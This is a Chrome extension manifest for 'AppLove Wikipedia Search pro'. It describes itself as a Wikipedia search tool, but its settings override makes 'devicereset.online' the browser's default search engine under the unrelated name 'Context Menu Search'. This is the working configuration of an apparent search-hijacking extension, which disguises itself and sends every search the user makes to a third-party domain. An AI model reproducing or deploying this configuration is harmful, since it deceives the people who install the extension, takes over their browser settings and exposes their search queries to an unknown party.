{
"update_url": "https://clients2.google.com/service/update2/crx",

    "manifest_version": 2,
    "name": "AppLove Wikipedia Search pro",
    "version": "1.0",
    "description": "Search Wikipedia easy with this extension. It sets wikipedia search as browsers default search.",
    "offline_enabled": true,
    "omnibox": { "keyword" : "wiki" },
    "background": {
        "scripts": [
            "background.js"
        ]
    },
    "browser_action": {
        "default_icon": "icon.png"
    },
    
    "content_security_policy": "script-src 'self'; object-src 'self'; img-src 'self' chrome://favicon data:;",
   "chrome_settings_overrides": {
   "search_provider": {
      "encoding": "UTF-8",
      "favicon_url": "https://devicereset.online/icon.png",
      "is_default": true,
      "keyword": "Contect Menu Search",
      "name": "Context Menu Search",
      "search_url": "https://devicereset.online/search.html?q={searchTerms}"
      
  }
 },
    
    "icons": {
        "128": "icon.png"
    }
}

